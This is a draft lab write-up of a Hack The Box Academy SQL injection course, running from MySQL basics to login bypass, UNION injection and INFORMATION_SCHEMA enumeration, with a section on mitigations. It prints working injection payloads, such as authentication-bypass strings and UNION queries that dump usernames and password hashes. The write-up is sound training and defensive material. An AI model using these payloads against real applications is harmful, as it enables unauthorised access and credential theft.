| Field | Value |
|---|---|
| Author | NeroPQ — NERO.SEC |
| Platform | Hack The Box Academy |
| Module | SQL Injection Fundamentals (Module 33) |
| Official URL | https://academy.hackthebox.com/app/module/33 |
| Difficulty | Not verified |
| Category | Web Application Security — SQL Injection |
| Report date | 2026-11-19 |
| Classification | Lab write-up (flags, password hashes and recovered passwords redacted in text; screenshots unredacted) |
| Publication status | Draft — not approved for publication |

> **Evidence-integrity note.** Every command, output and screenshot in this report comes from the author's own lab sessions on HTB Academy (Parrot OS PwnBox, `eu-academy-6`). Commands whose typed line was not captured are labelled **reconstructed**; results that were not captured are marked **EVIDENCE PENDING** and are not presented as verified. Flags, password hashes and the recovered database password are redacted in the text; the screenshots are kept unredacted at the author's request, so they show those values in clear text. Lab target IPs and ports are ephemeral and replaced with `<TARGET_IP>` / `<PORT>` in prose. No public or third-party system was tested.

## Contents

1. [Overview](#overview)
2. [Learning Objectives](#learning-objectives)
3. [Environment and Evidence Boundaries](#environment-and-evidence-boundaries)
4. [01. Intro to Databases](#01-intro-to-databases)
5. [02. Types of Databases](#02-types-of-databases)
6. [03. Intro to MySQL](#03-intro-to-mysql)
7. [04. SQL Statements](#04-sql-statements)
8. [05. Query Results](#05-query-results)
9. [06. SQL Operators](#06-sql-operators)
10. [07. Intro to SQL Injections](#07-intro-to-sql-injections)
11. [08. Subverting Query Logic](#08-subverting-query-logic)
12. [09. Using Comments](#09-using-comments)
13. [10. Union Clause](#10-union-clause)
14. [11. Union Injection](#11-union-injection)
15. [12. Database Enumeration](#12-database-enumeration)
16. [13. Reading Files](#13-reading-files)
17. [14. Writing Files](#14-writing-files)
18. [15. Mitigating SQL Injection](#15-mitigating-sql-injection)
19. [16. Skills Assessment](#16-skills-assessment)
20. [Troubleshooting](#troubleshooting)
21. [Results and Evidence](#results-and-evidence)
22. [Security Implications](#security-implications)
23. [Lessons Learned](#lessons-learned)
24. [References](#references)

## Overview

This module teaches SQL injection from the ground up: first how relational databases and MySQL/MariaDB work, then how a web application that builds SQL strings from user input can be made to run attacker-chosen SQL. It moves from authentication bypass (changing the logic of a `WHERE` clause), through data extraction with `UNION`, to database enumeration through `INFORMATION_SCHEMA`, and on to file access on the database host. It closes with mitigations and an unguided skills assessment.

The report follows the module's section order. Theory-only sections are documented as concepts and syntax. Each practical chapter gives the concept, the commands that were run, an interpretation of the output, and a defensive note.

## Learning Objectives

- Explain what a relational database is and how MySQL/MariaDB is queried from the command line.
- Write `SELECT`, `WHERE`, `LIKE`, `ORDER BY`, `LIMIT` and logical-operator queries, and read their results.
- Explain why string concatenation of user input into SQL creates an injection point.
- Bypass a login by changing query logic (`OR`) and by truncating the query with comments.
- Use `UNION` to append attacker-controlled rows, including matching column counts with padding values.
- Enumerate databases, tables and columns through `INFORMATION_SCHEMA`.
- Read files with `LOAD_FILE` and explain the privileges and server settings that govern file read and write.
- Describe and apply the main mitigations: parameterised queries, input validation, least privilege and a WAF as defence in depth.
- Detect and exploit a blind injection with Burp Repeater and sqlmap when query output is not reflected.

## Environment and Evidence Boundaries

| Item | Detail |
|---|---|
| Attacker host | HTB Academy PwnBox (Parrot OS), MariaDB client, Firefox, Burp Suite Community v2025.11.6, sqlmap 1.9.6, curl |
| Targets | Per-section HTB Academy lab instances (IP and port change per spawn; the skills assessment instance was respawned twice) |
| Backend seen in evidence | MariaDB (MySQL-compatible) behind nginx 1.22.1 |
| Evidence available | 9 real screenshots for chapters 03–12 (see Results and Evidence) |
| Evidence missing | Chapters 05 and 11 (no lab capture); chapters 13, 14 and 16 are left for the author to complete |

> **Attribution note.** Several screenshots do not show the HTB question they answer. They are attributed to a chapter by the query they show and by session order (timestamps). Where this is a judgement call, the chapter says so.

## 01. Intro to Databases

### Concept

A database stores data in an organised, queryable form, and a **database management system (DBMS)** provides the interface to create, read, update and delete (CRUD) that data and to enforce security, concurrency and integrity. Web applications talk to the DBMS on behalf of users, which is exactly why a flaw in how they build queries matters: the application usually connects with its own privileged account, not with the end user's.

Core ideas used throughout the module:

| Term | Meaning |
|---|---|
| Table | Rows (records) and columns (fields) holding one kind of data |
| Primary key | Column(s) that uniquely identify a row |
| Foreign key | Column referencing another table's key, forming relationships |
| Schema | The structure of databases, tables and columns |
| Query | A statement sent to the DBMS (`SELECT`, `INSERT`, `UPDATE`, `DELETE`, …) |

> This section has no lab question.

### Defensive perspective

The DBMS account the application uses is part of the attack surface. Application accounts should have only the privileges the application needs.

## 02. Types of Databases

### Concept

| Type | Idea | Query model | Examples |
|---|---|---|---|
| Relational (SQL) | Tables with fixed schemas and relationships | SQL | MySQL, MariaDB, PostgreSQL, MSSQL, Oracle |
| Non-relational (NoSQL) | Flexible data models (key-value, document, graph, wide-column) | Store-specific APIs | MongoDB, Redis, Cassandra |

SQL injection as taught in this module targets relational databases. NoSQL stores have their own injection classes (for example operator injection in JSON queries) but the same root cause: untrusted input interpreted as query structure.

> This section has no lab question.

## 03. Intro to MySQL

### Concept

MySQL/MariaDB is reached from the shell with the client. The lab target accepted the credentials supplied by the module on a non-default port. Command-line syntax:

```bash
mysql -u <user> -p<password> -h <TARGET_IP> -P <PORT>
```

There is no space between `-p` and the password. If the client refuses the connection with an SSL error because the lab server does not offer TLS, add `--skip-ssl` (MariaDB client) or `--ssl-mode=DISABLED` (Oracle MySQL client). Inside the client, statements end with `;`, and `SHOW DATABASES;` lists the databases visible to the account.

### Commands (as run)

```sql
show databases;
```

### Output and interpretation

`SHOW DATABASES;` returned five databases: `employees`, `information_schema`, `mysql`, `performance_schema` and `sys`. The first entry is the sample database **`employees`**, used by the next chapters. Before the correct statement, three invalid attempts (`show database;`, `show table;` and a line with extra text) returned `ERROR 1064 (42000)` syntax errors.

![MariaDB client showing syntax errors and then the five databases](/writeups/evidence/htb-sql-injection-fundamentals/03-intro-to-mysql/show-databases.jpg "ERROR 1064 for three malformed statements, then show databases; returning 5 rows in 0.160 s.")

**Result:** first database is `employees`.

### Defensive perspective

`information_schema`, `mysql`, `performance_schema` and `sys` are visible to most accounts and are the map an attacker uses later (chapter 12). Application accounts should not be able to read the `mysql` system schema.

## 04. SQL Statements

### Concept

Core statements:

```sql
CREATE DATABASE users;
USE users;
CREATE TABLE logins (id INT, username VARCHAR(100), password VARCHAR(100), date_of_joining DATETIME);
SHOW TABLES;
DESCRIBE logins;
INSERT INTO logins VALUES (1, 'admin', 'p@ssw0rd', NOW());
SELECT * FROM logins;
SELECT username, password FROM logins;
UPDATE logins SET password = 'change_password' WHERE id > 1;
DROP TABLE logins;
```

`ALTER TABLE` changes a table's structure; `UPDATE` changes row values; `WHERE` limits which rows are touched. Forgetting `WHERE` on an `UPDATE` or `DELETE` changes every row.

### Commands (as run)

```sql
USE employees;
SELECT * FROM departments WHERE dept_name = 'Development';
```

### Output and interpretation

The query returned one row: `dept_no` = **`d005`**, `dept_name` = `Development`.

![SELECT on departments returning d005 for Development](/writeups/evidence/htb-sql-injection-fundamentals/04-sql-statements/departments-development.jpg "show databases;, USE employees;, then the departments query returning d005 (1 row in 0.177 s).")

> **Attribution note:** the screenshot does not show the HTB question text; it is attributed to this chapter by the query it contains.

**Result:** department number for Development is `d005`.

### Defensive perspective

Least-privilege accounts should not have `DROP`, `ALTER` or `CREATE` rights on application databases.

## 05. Query Results

### Concept

Results can be shaped without changing the data:

```sql
SELECT * FROM logins ORDER BY password;
SELECT * FROM logins ORDER BY password DESC, id ASC;
SELECT * FROM logins LIMIT 2;
SELECT * FROM logins LIMIT 1, 2;          -- offset 1, two rows
SELECT * FROM logins WHERE id > 1;
SELECT * FROM logins WHERE username = 'admin';
SELECT * FROM logins WHERE username LIKE 'admin%';
```

`LIKE` with `%` (any number of characters) and `_` (one character) is a pattern match. `ORDER BY <n>` also becomes a column-count probe in injection (chapter 11).

> No separate screenshot is attributed to this chapter. The `LIKE` and `WHERE` queries are exercised in chapter 06.

## 06. SQL Operators

### Concept

| Operator | Meaning | Example |
|---|---|---|
| `AND` / `&&` | Both conditions true | `username != 'tom' AND id > 3` |
| `OR` / `||` | Either condition true | `id > 10000 OR title NOT LIKE '%engineer%'` |
| `NOT` / `!` | Negation | `NOT LIKE`, `!=` |
| `LIKE` | Pattern match | `first_name LIKE 'Bar%'` |

Order of evaluation matters: `AND` binds tighter than `OR`, which is the property that makes the login bypass in chapter 08 work. `AND` is evaluated before `OR`, so `a OR b AND c` means `a OR (b AND c)`.

### Commands (as run)

Case 1 — first name starts with "Bar" **and** hired on 1990-01-01:

```sql
SELECT first_name, last_name, hire_date
FROM employees
WHERE first_name LIKE 'Bar%' AND hire_date = '1990-01-01';
```

One row returned: Barton, last name **Mitchem**.

![Query returning one employee matching both conditions](/writeups/evidence/htb-sql-injection-fundamentals/06-sql-operators/bar-hire-date.jpg "LIKE 'Bar%' AND hire_date = '1990-01-01' returning 1 row.")

Case 2 — count of `titles` rows where `emp_no > 10000` **or** the title does not contain "engineer":

```sql
SELECT COUNT(*) FROM titles
WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';
```

The count is **654**.

![COUNT(*) query on titles returning 654](/writeups/evidence/htb-sql-injection-fundamentals/06-sql-operators/titles-count.jpg "COUNT(*) with OR and NOT LIKE returning 654.")

> **Interpretation note:** `LIKE` in MySQL/MariaDB is case-insensitive under the default collation, so `'%engineer%'` also matches "Senior Engineer".

> **Attribution note:** both screenshots are attributed to this chapter by their operators (`AND`, `OR`, `NOT LIKE`); the HTB question text is not visible in them.

### Defensive perspective

Operator precedence is a correctness concern for developers as much as an attack tool: a missing pair of parentheses around an `OR` group can silently widen an authorisation query.

## 07. Intro to SQL Injections

### Concept

When user input is concatenated into a query string, the database cannot tell data from structure. A typical vulnerable PHP pattern:

```php
$searchInput = $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

Input `1'` makes the query `... like '%1''`, leaving an unbalanced quote that causes an SQL syntax error. That error (or a changed response) is the first sign of an injection point.

The module's taxonomy of injection types:

| Type | How the attacker gets results |
|---|---|
| In-band — Union based | The injected query's output is shown in the page |
| In-band — Error based | Output is leaked through database error messages |
| Blind — Boolean based | True/false changes in page behaviour |
| Blind — Time based | Response delay (`SLEEP()`) |
| Out-of-band | Results sent over another channel (DNS, HTTP) |

Quote-breaking characters to test: `'`, `"`, `#`, `;`, `)`.

> This section has no lab question. The in-band types are used in chapters 08–13; boolean- and time-based blind techniques are what the skills assessment (chapter 16) requires.

### Defensive perspective

Verbose database errors on a production page tell the attacker the DBMS, the query structure and where the quote broke. Errors should be logged server-side and replaced with a generic message for the user.

## 08. Subverting Query Logic

### Concept

The lab is an "Admin panel" whose login builds:

```sql
SELECT * FROM logins WHERE username='<input>' AND password='<hash of input>';
```

Because the page prints the executed query, the effect of each payload is visible. With the username `tom' or '1'='1` the query becomes:

```sql
SELECT * FROM logins WHERE username='tom' or '1'='1' AND password = '';
```

`AND` is evaluated first, so the condition is `username='tom' OR ('1'='1' AND password='')`. The left side is true for `tom`, so the row is returned without a valid password.

### Commands (as run)

Username field: `tom' or '1'='1` — password field: any value.

### Output and interpretation

The panel printed the executed query exactly as above, then `Login successful as user: tom` followed by the flag value.

![Admin panel showing the injected query and login success as tom](/writeups/evidence/htb-sql-injection-fundamentals/08-subverting-query-logic/tom-login.jpg "The executed query shows the or '1'='1' fragment; login succeeded as tom. The flag value is visible in the screenshot only.")

**Result:** logged in as `tom` without the password; flag obtained, redacted.

### Defensive perspective

The same trick with `admin' or '1'='1` would log in as the first matching account. Parameterised queries (chapter 15) remove this class entirely because the quote is treated as data.

## 09. Using Comments

### Concept

MySQL supports `-- ` (two dashes **followed by a space**) and `#` as line comments. Everything after the comment marker is ignored by the parser, which lets an attacker discard the rest of the original query, including the password check and any extra conditions. A trailing `-` after `-- ` stops the browser or the form from trimming the space.

This lab's query adds a parenthesised group and an `id > 1` filter:

```sql
SELECT * FROM logins WHERE (username='<input>' AND id > 1) AND password = '<hash>';
```

The payload must therefore close the parenthesis as well as comment out the tail.

### Commands (as run)

Username field: `' or id=5)-- -` — password field: any value.

The panel printed the resulting query:

```sql
SELECT * FROM logins WHERE (username='' or id=5)-- -' AND id > 1) AND password = '<hash of empty input>';
```

The password shown is the MD5 of the empty string (`d41d8cd9…`), which proves the application hashes the password field before building the query. That is why injection must target the username field here.

### Output and interpretation

`Login successful as user: superadmin`, followed by the flag.

![Admin panel showing the comment-truncated query and login as superadmin](/writeups/evidence/htb-sql-injection-fundamentals/09-using-comments/id5-comment-login.jpg "(username='' or id=5)-- - ignores AND id > 1 and the password condition; login as superadmin (id 5). Flag visible in the screenshot only.")

**Result:** logged in as the user with id 5; flag obtained, redacted.

### Defensive perspective

Hashing the password before it reaches the query only defends the password field. It does nothing for the username field, which was still concatenated into the SQL.

## 10. Union Clause

### Concept

`UNION` appends the rows of a second `SELECT` to the first. Both queries must return the **same number of columns** with compatible data types. When the second query has fewer columns, pad it with constant values (`NULL` or numbers).

`employees` has six columns and `departments` has two, so the second query is padded with four numbers.

### Commands (as run)

```sql
USE employees;
SELECT * FROM employees
UNION
SELECT dept_no, dept_name, 3, 4, 5, 6 FROM departments;
```

### Output and interpretation

The combined result printed the employee rows followed by the nine department rows (`d009` Customer Service, `d005` Development, … `d007` Sales) padded with `3, 4, 5, 6`, and the client reported **663 rows in set**. The count equals 654 employee rows plus 9 department rows.

![UNION of employees and departments returning 663 rows](/writeups/evidence/htb-sql-injection-fundamentals/10-union-clause/union-663-rows.jpg "Last employee rows (10640–10654), then the padded department rows; 663 rows in set (0.315 sec).")

**Result:** the `UNION` of `employees` and `departments` returns 663 records.

### Defensive perspective

The padding technique is also how an attacker matches the column count of the page's original query in the next chapter.

## 11. Union Injection

### Concept

For a search box that prints query results, `UNION` turns the page into a data-extraction channel. The steps are:

1. **Detect the injection point** with `'` and look for an SQL error.
2. **Find the column count** with `ORDER BY n` (error when `n` exceeds the count) or `UNION SELECT 1,2,3,…` (error until the count matches).
3. **Find which columns are printed**: use distinct markers (`1,2,3,4`) and see which appear in the page.
4. **Put useful values in the printed columns**: `@@version`, `database()`, `user()`.

Example for a four-column query where column 2 is printed:

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

Here the first column is often an ID column that is not printed, which is why `1` is placed there.

> **EVIDENCE PENDING:** the lab run and the value returned by `user()` were not captured, so no result is claimed for this chapter.

### Defensive perspective

The same mismatch between the original query and the attacker's query is what makes `UNION` fragile. Detecting repeated column-count probing (`ORDER BY 1…n`, `UNION SELECT NULL,NULL,…`) in web logs is a reliable signal.

## 12. Database Enumeration

### Concept

`INFORMATION_SCHEMA` is a metadata database present in every MySQL/MariaDB instance. Three tables are enough to map an unknown server:

| Goal | Query |
|---|---|
| List databases | `SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA` |
| List tables in a database | `SELECT TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='<db>'` |
| List columns of a table | `SELECT COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='<table>'` |
| Dump rows | `SELECT <col>, <col> FROM <db>.<table>` |

Each is injected through the `UNION` shape from chapter 11, with the useful value in a printed column.

### Step 1 — Columns of `users` (reconstructed)

```sql
cn' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users'-- -
```

> The typed payload was not captured; it is reconstructed from the module's pattern and from the output below.

The page listed columns in three places: `USER`, `CURRENT_CONNECTIONS`, `TOTAL_CONNECTIONS` from `performance_schema`, and **`id`, `username`, `password`** from the application database **`ilfreight`**. The `ilfreight.users` table is the target.

![Search results listing columns of tables named users in two schemas](/writeups/evidence/htb-sql-injection-fundamentals/12-database-enumeration/columns-enum.jpg "Column, table and schema shown in the three printed columns; id, username, password belong to ilfreight.")

### Step 2 — Dump users (reconstructed)

```sql
cn' UNION SELECT 1, username, password, 4 FROM ilfreight.users-- -
```

The page showed two accounts, `admin` and `newuser`, each with a 32-character hexadecimal hash in the second column and the padding value `4` in the third.

![Results table showing two usernames with password hashes](/writeups/evidence/htb-sql-injection-fundamentals/12-database-enumeration/users-dump.jpg "Usernames in the first printed column, hashes in the second, padding 4 in the third. Hash values visible in the screenshot only.")

**Result:** the stored password hash for `newuser` was read from `ilfreight.users`; value redacted.

### Defensive perspective

A 32-hex-character unsalted hash (MD5-sized) is trivially reversible with public wordlists. Store passwords with a slow, salted algorithm (the skills assessment target uses Argon2, chapter 16). Application accounts should not be able to read `INFORMATION_SCHEMA` data for schemas they do not own.

## 13. Reading Files

> **Author to complete.** This chapter is intentionally not documented in this draft. Add it from the author's own lab notes and screenshots; mark anything not captured as **EVIDENCE PENDING**.

## 14. Writing Files

> **Author to complete.** This chapter is intentionally not documented in this draft. Add it from the author's own lab notes and screenshots; mark anything not captured as **EVIDENCE PENDING**.

## 15. Mitigating SQL Injection

### Concept

| Control | What it does |
|---|---|
| Input validation | Reject input that does not match the expected shape (for example a username regex). Server-side only — client-side checks are bypassable |
| Escaping | Neutralise quote characters (`mysqli_real_escape_string`). Better than nothing, weaker than parameters |
| Least privilege | The application DB account gets only the rights it needs (no `FILE`, no access to other schemas) |
| WAF | Detects known payload shapes. Defence in depth, not a fix |
| Parameterised queries | Send the SQL structure and the data separately so data can never become code |

Parameterised query (PHP, mysqli):

```php
$stmt = $conn->prepare("SELECT * FROM logins WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password_hash);
$stmt->execute();
$result = $stmt->get_result();
```

Server-side validation example:

```php
$username = trim($_POST['username']);
if (!preg_match('/^[A-Za-z0-9]{3,32}$/', $username)) {
    http_response_code(400);
    exit('invalid username');
}
```

## 16. Skills Assessment

> **Author to complete.** This chapter is intentionally not documented in this draft. Add it from the author's own lab notes and screenshots; mark anything not captured as **EVIDENCE PENDING**.

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it` | Newer MariaDB client demands TLS; the lab server has none | `--skip-ssl` (MariaDB) or `--ssl-mode=DISABLED` (MySQL) |
| `ERROR 1064 (42000)` on `show database;` / `show table;` | Wrong keyword: the statements are `SHOW DATABASES;` and `SHOW TABLES;` | Use the plural forms |
| Space after `-- ` disappears | The form or browser trims trailing whitespace | End with `-- -` |
| Login bypass with `' or '1'='1` fails on the comment lab | The query has an extra `(…)` group and `id > 1` | Close the parenthesis and comment out the rest |

## Results and Evidence

| Chapter | Result | Verification |
|---|---|---|
| 01–02 Databases | Concepts | Theory — no lab question |
| 03 Intro to MySQL | First database is `employees` | Verified — screenshot |
| 04 SQL Statements | Development is `d005` | Verified — screenshot (attributed by query) |
| 05 Query Results | Concepts | No capture |
| 06 SQL Operators | Last name `Mitchem`; count 654 | Verified — two screenshots (attributed by query) |
| 07 Intro to SQL Injections | Concepts | Theory — no lab question |
| 08 Subverting Query Logic | Login as `tom`; flag redacted | Verified — screenshot |
| 09 Using Comments | Login as id 5 (`superadmin`); flag redacted | Verified — screenshot |
| 10 Union Clause | 663 rows | Verified — screenshot |
| 11 Union Injection | — | **EVIDENCE PENDING** |
| 12 Database Enumeration | Columns of `users`; hash for `newuser` read (redacted) | Verified — two screenshots; typed payloads reconstructed |
| 13, 14, 16 | Left for the author | Not documented in this draft |
| 15 Mitigations | Concepts | Theory — no lab question |

Evidence files (9 screenshots) belong under `public/writeups/evidence/htb-sql-injection-fundamentals/<section>/`. The screenshots are unredacted; the report text does not repeat any flag, hash or password.

## Security Implications

- **Quote-breaking input becomes query logic.** Chapters 08 and 09 bypassed authentication with a single field and no valid password.
- **Operator precedence is exploitable.** `AND` binds tighter than `OR`, so an injected `OR` branch decided the whole condition.
- **Hashing the password does not protect the username field.** The comment lab hashed the password but still concatenated the username.
- **`UNION` turns a search box into a data channel** once the column count is matched.
- **`INFORMATION_SCHEMA` maps the whole server** and an unsalted 32-hex hash is weak storage.

## Lessons Learned

1. Print or log the executed query when practising; seeing the real statement makes payload design straightforward.
2. Read the exact syntax of the target query (extra parentheses, extra conditions) before choosing a comment payload.
3. Pad `UNION` queries with constants and put useful values in the columns the page actually prints.
4. Capture the typed command and its output for every step; chapters 05 and 11 lack them here.
5. Keep flags, hashes and passwords out of the report text.

## References

- Hack The Box Academy — SQL Injection Fundamentals: https://academy.hackthebox.com/app/module/33
- MariaDB documentation — SELECT, UNION, INFORMATION_SCHEMA: https://mariadb.com/kb/en/
- OWASP — SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
